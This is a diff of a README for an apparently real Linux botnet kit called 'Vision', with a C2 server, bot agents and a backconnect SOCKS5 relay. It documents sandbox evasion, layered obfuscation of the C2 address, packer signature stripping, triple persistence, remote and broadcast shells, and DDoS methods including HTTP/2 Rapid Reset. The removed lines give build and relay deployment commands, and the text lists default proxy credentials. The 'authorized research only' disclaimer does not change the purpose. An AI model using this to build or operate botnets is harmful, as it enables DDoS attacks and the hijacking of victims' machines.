@@ -29,10 +29,10 @@
 | **Automated Setup** | Python wizard handles config, compilation, and deployment. Run once, done. |
 | **Encrypted Transport** | TLS 1.3 bot↔C2 over port 443. Indistinguishable from normal HTTPS. |
 | **Anti-Analysis** | 40+ VM/sandbox/debugger signatures. Parent process detection. Sandboxes never reach `main()`. |
-| **Stealth Driven** | All strings AES-128-CTR encrypted at build time (unique per build split-key derivation). C2 address decoded through a 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Custom UPX packer obfuscates every binary. |
+| **Stealth Driven** | All strings AES-128-CTR encrypted at build time (per-build random key). C2 address decoded through a 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Bundled UPX packer with signature stripping obfuscates every binary. |
 | **HMAC Registration** | MD5 challenge-response with per-campaign sync tokens. Replay-proof. |
 | **Triple Persistence** | Systemd + cron watchdog + rc.local. Kill one, the others revive it. |
-| **SOCKS5 Pivoting** | Route SOCKS5 through bot or optionally backconnect through your configured proxy relay endpoints.   |
+| **SOCKS5 Pivoting** | Backconnect relay (primary) or direct listener. Multi-relay failover with auto-reconnect. Disposable relay VPS keeps C2 hidden. |
 | **Remote Shell** | Full output capture. Built-in Linux shortcuts + post-exploit helpers. |
 | **Daemon Stealth** | Fork+setsid, disguised process names, PID lock prevents duplicate agents. |
 | **L7 Arsenal** | Cloudflare bypass, HTTP/2 Rapid Reset (CVE-2023-44487), TLS bypass, proxy list support. |
@@ -125,34 +125,6 @@ Split mode: `nc YOUR_IP 420` → type `spamtec` → login. (legacy)
 
 ---
 
-```bash
-# Full interactive setup (generates crypto, patches config, builds everything)
-python3 setup.py
-
-# Build CNC server only
-go build -trimpath -ldflags="-s -w -buildid=" -o server ./cnc
-
-# Build single bot binary (e.g. amd64)
-GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w -buildid=" -o bins/ethd0 ./bot
-
-# Cross-compile all 14 bot architectures (with strip + UPX + signature removal)
-cd tools && ./build.sh
-
-# Verify encrypted config blobs are valid
-go run tools/crypto.go verify
-
-# Encrypt/decrypt strings for config
-go run tools/crypto.go encrypt "string"
-go run tools/crypto.go decrypt <hex>
-
-# Build relay server (deploy on separate VPS)
-go build -trimpath -ldflags="-s -w -buildid=" -o relay ./relay
-
-# Run relay (must match bot's syncToken / CNC MAGIC_CODE)
-./relay -key <magic_code> -cp 9001 -sp 1080
-
-```
-
 ## 🎨 TUI Navigation
 
 | Key | Action |
@@ -164,25 +136,26 @@ go build -trimpath -ldflags="-s -w -buildid=" -o relay ./relay
 
 ### Dashboard Views
 
-- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
-- **💻 Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
-- **📡 Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
+- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
+- **💻 Remote Shell** — Interactive shell to one bot. Tabs: Shell / Shortcuts / Linux helpers. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
+- **📡 Broadcast Shell** — Command all bots. Tabs: Command / Shortcuts. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
 - **⚡ Launch Attack** — Select method, target, port, duration → `l` to launch
 - **📊 Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
-- **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://visionc2:synackrst666@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
+- **🧦 Socks Manager** — `s`=quick start (relay), `c`=custom relay, `d`=direct mode, `x`=stop. Default creds: `vision:vision`. Update: `!socksauth <user> <pass>`
 - **📜 Connection Logs** — Bot connect/disconnect history
+
 
 ---
 
 ## Architecture
 
-**Bot lifecycle:** decrypt config → daemonize → singleton lock → sandbox detect → persistence (systemd/cron/rc.local) → DNS resolve C2 → TLS connect → auth (HMAC challenge-response) → command loop with auto-reconnect.
+Vision has two components:
 
-**CNC modes:** TUI (`cnc/ui.go`, ~3400 lines, Bubble Tea) or split/telnet CLI (`cnc/cmd.go`). RBAC with 4 tiers: Basic/Pro/Admin/Owner.
+**`cnc/`** — The Command & Control server. Dual-listener: TLS on 443 for bot connections, interactive TUI built with Bubble Tea. RBAC with four permission tiers (Basic / Pro / Admin / Owner) configured in `users.json`.
 
-**Bot-CNC protocol:** TLS 1.2+ on port 443. HMAC auth using `magicCode`. Bot sends `REGISTER:version:botID:arch:RAM:CPU:procName:uplink`. Commands/responses are plaintext over TLS. Keepalive: PING/PONG every 60s, stale cleanup after 5min.
+**`bot/`** — The agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config → daemonize → sandbox detection → singleton lock → install persistence → DNS-resolve C2 → connect with reconnect loop.
 
-**SOCKS5 backconnect proxy:** Bot connects OUT to a relay server (`relay/`) via TLS. Relay has two ports: control (for bots, TLS) and SOCKS5 (for clients, plaintext). When a SOCKS5 client connects to the relay, the relay signals the bot over the control channel, bot opens a new data connection, and runs the SOCKS5 protocol through the relay tunnel. C2 address is never exposed — relay is separate infrastructure. Relay endpoints can be pre-configured at build time via `setup.py` or specified at runtime via `!socks <relay:port>`.
+**`relay/`** — Backconnect SOCKS5 relay server. Sits between proxy users and bots — bots connect out to the relay via TLS, users connect to the relay's SOCKS5 port. Disposable infrastructure that keeps C2 hidden. Multi-relay failover with auto-reconnect and exponential backoff.
 
 ---
 
@@ -194,17 +167,10 @@ go build -trimpath -ldflags="-s -w -buildid=" -o relay ./relay
 | [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history |
 | [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
 | [`SETUP.md`](Docs/SETUP.md) | Setup guide |
+| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 relay deployment |
 
 ---
 
-## Key Dependencies
-
-- `github.com/charmbracelet/bubbletea` — TUI framework (CNC)
-- `github.com/google/gopacket` — raw packet crafting (L4 attacks)
-- `github.com/miekg/dns` — DNS protocol (C2 resolution, DNS attacks)
-- External: `upx` (binary compression), `python3` (setup wizard), `openssl` (cert generation)
-
-  
 ## Legal Disclaimer
 
 **For authorized security research and educational purposes only.** Usage of this tool against targets without prior mutual consent is illegal. The developer assumes no liability for misuse or damage caused by this program.
@@ -213,6 +179,6 @@ go build -trimpath -ldflags="-s -w -buildid=" -o relay ./relay
 
 <div align="center">
 
-**Syn2Much** — [hell@sinnners.city](mailto:hell@sinnners.city) | [@synacket](https://x.com/synacket)
+**Syn2Much** — [dev@sinnners.city](mailto:dev@sinnners.city) | [@synacket](https://x.com/synacket)
 
 </div>
